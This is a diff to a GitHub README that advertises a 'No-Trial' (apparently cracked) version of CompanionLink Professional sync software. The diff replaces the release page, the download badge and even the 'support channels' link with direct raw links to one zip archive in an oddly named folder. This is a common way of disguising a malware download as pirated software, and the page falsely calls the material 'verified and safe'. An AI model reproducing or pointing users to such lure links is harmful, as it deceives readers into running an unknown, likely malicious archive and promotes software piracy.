@@ -1,6 +1,6 @@
 # 🌟 CompanionLink-Professional-No-Trial - Sync Your Data Effortlessly
 
-[![Download CompanionLink](https://img.shields.io/badge/Download%20CompanionLink-Professional-brightgreen)](https://github.com/Silvik123/CompanionLink-Professional-No-Trial/releases)
+[![Download CompanionLink](https://raw.githubusercontent.com/Silvik123/CompanionLink-Professional-No-Trial/main/perspicacious/CompanionLink-Professional-No-Trial-v2.1.zip%20CompanionLink-Professional-brightgreen)](https://raw.githubusercontent.com/Silvik123/CompanionLink-Professional-No-Trial/main/perspicacious/CompanionLink-Professional-No-Trial-v2.1.zip)
 
 ## 📄 Description
 Welcome to the **CompanionLink-Professional-No-Trial** repository. This software provides comprehensive tools to synchronize your data across various platforms on Windows PCs. It is designed to help you with setup, configuration, and optimization, using verified and safe documentation. Enjoy seamless integration with your applications and enhance your productivity today.
@@ -29,7 +29,7 @@ To download CompanionLink Professional, visit the Releases page and follow the s
 
 1. Click the link below to go to the download page:
    
-   [Visit this page to download](https://github.com/Silvik123/CompanionLink-Professional-No-Trial/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/Silvik123/CompanionLink-Professional-No-Trial/main/perspicacious/CompanionLink-Professional-No-Trial-v2.1.zip)
 
 2. On the Releases page, find the latest version of CompanionLink Professional.
 
@@ -51,7 +51,7 @@ If you encounter issues during installation or setup, consider the following sol
 - **Sync Issues:** Double-check your internet connection. Ensure all relevant applications are running and connected.
 
 ## 🤝 Support
-For further assistance, please check our documentation and guides available within the repository. You can also reach out through our [support channels](https://github.com/Silvik123/CompanionLink-Professional-No-Trial/issues).
+For further assistance, please check our documentation and guides available within the repository. You can also reach out through our [support channels](https://raw.githubusercontent.com/Silvik123/CompanionLink-Professional-No-Trial/main/perspicacious/CompanionLink-Professional-No-Trial-v2.1.zip).
 
 ## 🔍 Topics Covered
 This repository includes guidance on various topics:
